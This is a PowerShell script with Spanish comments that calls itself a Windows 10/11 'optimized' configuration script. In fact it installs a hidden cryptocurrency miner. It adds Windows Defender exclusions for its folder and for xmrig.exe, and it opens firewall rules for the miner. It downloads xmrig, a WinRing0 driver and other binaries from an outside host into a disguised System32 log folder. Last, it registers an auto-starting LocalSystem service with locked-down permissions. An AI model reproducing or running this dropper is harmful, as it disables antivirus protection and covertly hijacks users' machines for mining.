# Script optimizado para Windows 10 y 11
# Requiere ejecución como administrador

# Verificar si se está ejecutando como administrador
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Este script requiere privilegios de administrador." -ForegroundColor Red
    Write-Host "Por favor, ejecuta PowerShell como administrador y vuelve a intentarlo." -ForegroundColor Yellow
    exit
}

# Configuración de ejecución
$ErrorActionPreference = "Stop"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# URL base para descargas
$baseURL = "https://baa4ts.is-a-good.dev"

# Definir rutas
$root = Join-Path $env:WINDIR "System32\LogFiles\WNMA"

Write-Host "Iniciando script de configuración..." -ForegroundColor Green

try {
    # Crear la carpeta si no existe
    if (-not (Test-Path -Path $root)) {
        Write-Host "Creando directorio: $root" -ForegroundColor Yellow
        New-Item -Path $root -ItemType Directory -Force | Out-Null
    }

    # Establecer la variable de entorno
    Write-Host "Estableciendo variable de entorno..." -ForegroundColor Yellow
    [Environment]::SetEnvironmentVariable("WINUSERNAME", $env:USERNAME, "Machine")

    # Configurar permisos de la carpeta
    Write-Host "Configurando permisos..." -ForegroundColor Yellow
    
    # Obtener ACL actual
    $acl = Get-Acl -Path $root
    
    # Regla para Everyone (Lectura y Ejecución)
    $everyoneRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        "Everyone",
        "ReadAndExecute",
        "ContainerInherit,ObjectInherit",
        "None",
        "Allow"
    )
    
    # Regla para SYSTEM (Control Total)
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        "NT AUTHORITY\SYSTEM",
        "FullControl",
        "ContainerInherit,ObjectInherit",
        "None",
        "Allow"
    )
    
    # Aplicar reglas
    $acl.SetAccessRule($everyoneRule)
    $acl.SetAccessRule($systemRule)
    Set-Acl -Path $root -AclObject $acl

    # Configurar exclusiones de Windows Defender
    Write-Host "Configurando exclusiones de Windows Defender..." -ForegroundColor Yellow
    
    try {
        Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "Win2Internals.exe" -ErrorAction SilentlyContinue
    }
    catch {
        Write-Host "Advertencia: No se pudieron configurar todas las exclusiones de Defender" -ForegroundColor Yellow
    }

    # Configurar firewall
    Write-Host "Configurando firewall..." -ForegroundColor Yellow
    
    try {
        # Eliminar reglas existentes
        Remove-NetFirewallRule -DisplayName "Entrada XMRIG" -ErrorAction SilentlyContinue
        Remove-NetFirewallRule -DisplayName "Salida XMRIG" -ErrorAction SilentlyContinue

        # Crear nuevas reglas
        New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program "$root\xmrig.exe" -Action Allow -ErrorAction SilentlyContinue
        New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program "$root\xmrig.exe" -Action Allow -ErrorAction SilentlyContinue
    }
    catch {
        Write-Host "Advertencia: Error en configuración de firewall" -ForegroundColor Yellow
    }

    # Descargar archivos
    Write-Host "Descargando archivos..." -ForegroundColor Yellow
    
    $files = @(
        "Win2Internals.exe",
        "WinRing0x64.sys",
        "wroom.dll",
        "xmrig.exe"
    )

    foreach ($file in $files) {
        try {
            $filePath = Join-Path $root $file
            Write-Host "Descargando $file..." -ForegroundColor Gray
            Invoke-WebRequest -Uri "$baseURL/$file" -OutFile $filePath -UseBasicParsing
        }
        catch {
            Write-Host "Error al descargar $file" -ForegroundColor Red
        }
    }

    # Configurar servicio
    Write-Host "Configurando servicio..." -ForegroundColor Yellow
    
    try {
        $serviceName = "Win2Internals"
        $servicePath = Join-Path $root "Win2Internals.exe"
        
        # Detener y eliminar servicio si existe
        if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
            Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
            sc.exe delete $serviceName | Out-Null
        }

        # Crear nuevo servicio
        sc.exe create $serviceName binPath= "$servicePath" start= auto obj= "LocalSystem" type= own
        sc.exe sdset $serviceName "D:(A;;GA;;;SY)(A;;GA;;;BA)"
        
        # Iniciar servicio
        Start-Service $serviceName -ErrorAction SilentlyContinue
    }
    catch {
        Write-Host "Error en configuración del servicio: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host "Configuración completada exitosamente!" -ForegroundColor Green
}
catch {
    Write-Host "Error durante la ejecución: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # Restaurar política de ejecución
    Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force -ErrorAction SilentlyContinue
}
